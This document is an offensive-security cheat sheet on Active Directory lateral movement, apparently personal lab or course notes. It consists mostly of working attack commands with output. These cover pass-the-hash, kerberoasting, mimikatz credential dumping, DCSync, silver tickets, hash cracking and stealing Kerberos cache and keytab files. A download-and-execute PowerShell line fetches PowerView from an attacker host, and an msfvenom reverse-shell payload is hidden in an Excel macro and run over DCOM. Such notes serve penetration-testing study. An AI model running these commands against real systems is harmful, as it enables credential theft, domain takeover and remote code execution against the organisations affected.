# Lateral Movement

<details>

<summary>Admin Password Reuse</summary>

Using crackmapexec:

```bash
└─# crackmapexec smb 10.11.1.20-24 -u administrator -H 'ee0c207898a5bccc01f38115019ca2fb' --local-auth --lsa 
SMB         10.11.1.22      445    SVCLIENT08       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT08) (domain:SVCLIENT08) (signing:False) (SMBv1:True)
SMB         10.11.1.21      445    SV-FILE01        [*] Windows Server 2016 Standard 14393 x64 (name:SV-FILE01) (domain:SV-FILE01) (signing:False) (SMBv1:True)
SMB         10.11.1.24      445    SVCLIENT73       [*] Windows 10 Pro N 14393 x64 (name:SVCLIENT73) (domain:SVCLIENT73) (signing:False) (SMBv1:True)
SMB         10.11.1.20      445    SV-DC01          [*] Windows 10.0 Build 17763 x64 (name:SV-DC01) (domain:SV-DC01) (signing:True) (SMBv1:False)
SMB         10.11.1.22      445    SVCLIENT08       [+] SVCLIENT08\administrator:ee0c207898a5bccc01f38115019ca2fb (Pwn3d!)
SMB         10.11.1.21      445    SV-FILE01        [-] SV-FILE01\administrator:ee0c207898a5bccc01f38115019ca2fb STATUS_LOGON_FAILURE 
SMB         10.11.1.24      445    SVCLIENT73       [+] SVCLIENT73\administrator:ee0c207898a5bccc01f38115019ca2fb (Pwn3d!
```

* Login with impacket psexec using hashes

```bash
impacket-psexec jimmy@192.168.35.142 -hashes ee0c207898a5bccc01f38115019ca2fb
```

</details>

<details>

<summary>Obtain Kerberos Ticket</summary>

* Sync the Kali's timing with the DC timing.

```bash
ntpdate <dc_ip>
```

* To collect the Kerberos Ticket

```bash
impacket-GetUserSPNs hacker.local/Administrator:Password1 -dc-up 192.168.35.142 -request
```

</details>

<details>

<summary>Getting TGT from Service</summary>

For pass the ticket attack

```bash
impacket-GetNPUsers -dc-ip 10.10.10.10 active.htb/SVC-TGS -no-pass
```

</details>

<details>

<summary>Pass the Hash</summary>

* Works only for server or service using NTLM authentication, not Kerberos authentication.
* Requires local administrative permissions.

Retrieve the content of the Windows Security Account Manager (SAM) file to dump client01's hashes.

```sh
reg save hklm\sam c:\windows\temp\sam
```

```sh
reg save hklm\system c:\windows\temp\system
```

```sh
impacket-secretsdump -system system -sam sam local
```

```bash
impacket-secretsdump Hacker.local/hguy:password@192.168.35.144'
```

Connect to victim by passing the hash

```sh
impacket-psexec Administrator:@192.168.199.59 -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5
```

* hashes in the format: \<LM>:\<NT>
* LM hashes discontinued since Win10

</details>

<details>

<summary>Kerberoasting</summary>

To obtain TGS-REP hash to crack service accounts passwords.

### Invoke-Kerberoast.ps1

Collects a list of service accounts along with their correlating password hashes

```sh
powershell -ep bypass -c "Import-Module .\Invoke-Kerberoast.ps1; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"
```

### Rubeus.exe

[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)

```bash
C:\temp>Rubeus.exe kerberoast
Rubeus.exe kerberoast

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Kerberoasting
...
```

### GetUserSPNs.py

* Good when don't have access to the victim
* On the attacker:

```bash
GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```

### Transferring Files

```sh
python2.7 -m pyftpdlib -p 21 --write
```

### Cracking Hashes

```sh
hashcat -m 13100 -a 0 kerb.txt /usr/share/wordlists/rockyou.txt
```

</details>

<details>

<summary>Overpass the Hash</summary>

* “Over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket or service ticket
* Requires local admin rights

1. Obtain the NTLM hash first&#x20;

```
mimikatz.exe
```

```
privilege::debug
```

```
sekurlsa::logonpasswords
```

2. Creates a new PowerShell process in the context of the Jeff\_Admin user

```
sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```

3. Inside the new Powershell session, generate a TGT by authenticating to a network share on the domain controller.&#x20;

```powershell
net use \\dc01
```

* We used "net use" arbitrarily in this example but we could have used any command that requires domain permissions and would subsequently create a TGS.

```
klist
```

4. Since we have generated Kerberos tickets and operate in the context of Jeff\_Admin in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller

```
.\PsExec.exe \\dc01 cmd.exe
```

</details>

<details>

<summary>Pass the Ticket</summary>

Takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service.

1. Obtain SID of user

```sh
whoami /user
```

* Eg: SID:S-1-5-21-1602875587-2787523311-2599479668-1103 (Don't include 1103)&#x20;

2. Use Mimikatz

```bash
kerberos:purge
```

```bash
kerberos::list
```

* Ensure that no kerberos ticket is present

```bash
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```

* To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.

```
kerberos::list
```

3. Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information based on the group memberships we put in the silver ticket.

</details>

<details>

<summary>NTDSam</summary>



</details>

<details>

<summary>DCSync</summary>

### From Bloodhound:

![](<../.gitbook/assets/image (140).png>)

### Using Secretsdump

```bash
secretsdump.py -just-dc svc_loanmgr@10.10.10.175 -outputfile dcsync_hashes
#Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

#Password:
#[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
#[*] Using the DRSUAPI method to get NTDS.DIT secrets
#Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

### Using Mimikatz (Powershell)

* Download Invoke-Mimikatz.ps1 from [here](https://github.com/phra/PowerSploit/raw/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1)

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:administrator"'
# OR
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator"'
```

</details>

<details>

<summary>Cracking Mscash (Cached Domain Credentials)</summary>

[https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)

```bash
secretsdump.py administrator@172.16.197.11 -hashes :f1014ac49bae005ee3ece5f47547d185 
# MEDTECH.COM/Administrator:$DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7
# MEDTECH.COM/yoshi:$DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
# MEDTECH.COM/wario:$DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a
```

### Format into $DCC2$10240#username#hash format for hashcat&#x20;

```bash
echo ; cat hashes.txt ; echo ; cut -d ":" -f 2 medtech_hashes
# $DCC2$10240#Administrator#a7c5480e8c1ef0ffec54e99275e6e0f7
# $DCC2$10240#yoshi#cd21be418f01f5591ac8df1fdeaa54b6
# $DCC2$10240#wario#b82706aff8acf56b6c325a6c2d8c338a
# $DCC2$10240#joe#464f388c3fe52a0fa0a6c8926d62059c
```

### Crack with Hashcat

```bash
hashcat -m 2100 -a 0 hash.txt rockyou.txt
```

</details>

<details>

<summary>WriteDacl (Bloodhound)</summary>

* Download PowerView from [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)

#### On Victim:

```bash
*Evil-WinRM* PS C:\temp> Bypass-4MSI
Info: Patching 4MSI, please be patient...
[+] Success!

*Evil-WinRM* PS C:\temp> iex(new-object net.webclient).downloadstring('http://10.10.14.4/PowerView.ps1')

*Evil-WinRM* PS C:\temp> net user john abc123! /add /domain
The command completed successfully.
*Evil-WinRM* PS C:\temp> net group "Exchange Windows Permissions" john /add
# Needed cuz based on bloodhound, exhange windows permissions group has writedacl privileges for domain
The command completed successfully.
*Evil-WinRM* PS C:\temp> net localgroup "Remote Management Users" john /add
The command completed successfully.

*Evil-WinRM* PS C:\temp> $pass = convertto-securestring 'abc123!' -asplain -force
*Evil-WinRM* PS C:\temp> $cred = new-object system.management.automation.pscredential('htb\john', $pass)
*Evil-WinRM* PS C:\temp> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

#### On Attacker:

```bash
secretsdump.py htb/john@10.10.10.161
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

</details>

<details>

<summary>Distributed Component Object Model</summary>

* is a system for creating software components that interact with each other within or across processes.

- Requires Local admin (to call the DCOM Service Control Manager)
- Requires port 135, 445
- Requires Microsoft office to be installed on target

1. Create an instance of the Object on the target

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
```

2. Check the available methods for the object

```powershell
$com | Get-Member
```

* If it has the `Run` method, attacker is able to execute Visual Basic for Applications (VBA) macro remotely.

3. Generate Reverse shell payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
```

4. Extract from the generated payload, the line starting with `powershell.exe -nop -w hidden -e` followed by the Base64 encoded payload and use the simple Python script to split the command into smaller chunks (ensuring that the literal strings limit in Excel macros is met.)

```python
str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```

5. Put the reverse shell payload into macro

```vba
Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
    Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
    ...
    Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
    Str = Str + "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
    Shell (Str)
End Sub
```

* Save the file in `Excel 97-2003 Workbook` format.

6. Transfer the file over to target using SMB, open the excel file and run the macro.

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")

```

</details>

<details>

<summary>Dump Password Hashes from Domain Controller</summary>

```bash
mimikatz.exe
```

```bash
privilege::debug
```

```bash
lsadump::dcsync /all /csv
```

</details>

<details>

<summary>Change Domain Admin password</summary>

* From high privilege shell
* Changes the password to `password`

```sh
net user /domain administrator password
```

</details>

<details>

<summary>Open CMD Prompt as Another User</summary>

```bash
runas /user:corp\jen powershell.exe
```

</details>

<details>

<summary>Stealing Keytab files (Linux AD)</summary>

* Contains a kerberos principal name & encrypted keys
*   ```bash
    kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
    ```


* Verify that tickets from keytab have been loaded && renew tickets
  *   ```bash
      klist
      kinit -R
      ```


* Remove all kerberos tickets
  * ```bash
    kdestroy
    ```

</details>

<details>

<summary>Stealing Credential Cache Files (Linux AD)</summary>

* Check for presence with&#x20;
  *   ```bash
      ls -al /tmp/krb5cc_*
      ```


* Copy credential cache files to Kali
  *   ```bash
      scp root@linuxvictim:/tmp/krb5cc_607000500_qZWKpe .
      ```


* Set environment variable on Kali
  *   ```bash
      export KRB5CCNAME=/home/kali/Documents/offsec/linux_lateral_movement/krb5cc_607000500_qZWKpe
      ```


* Install the following, if required
  *   ```bash
      sudo apt install krb5-user
      ```


  *

      <figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>


* Add target DC and generic domain to /etc/hosts
  *

      <figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>


* IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
* Then, can
  * ```bash
    python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
    ```

</details>

<details>

<summary>Creating Keytab files (Linux AD)</summary>

* Create in /tmp/administrator.keytab
* ```bash
  ktutil
  addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac
  wkt /tmp/administrator.keytab
  quit
  ```

</details>

<details>

<summary>Creating Credential Cache Files (Linux AD)</summary>

* Acquire TGT for current user
  *   ```bash
      kinit
      ```


* List tickets currently stored in user's credential cache file
  *   ```bash
      klist
      ```


* Get a list of available SPN from DC
  *   ```bash
      ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
      ```


* Request a service ticket from Kerberos for MSSQL SPN
  * ```bash
    kvno MSSQLSvc/DC01.corp1.com:1433
    ```

</details>
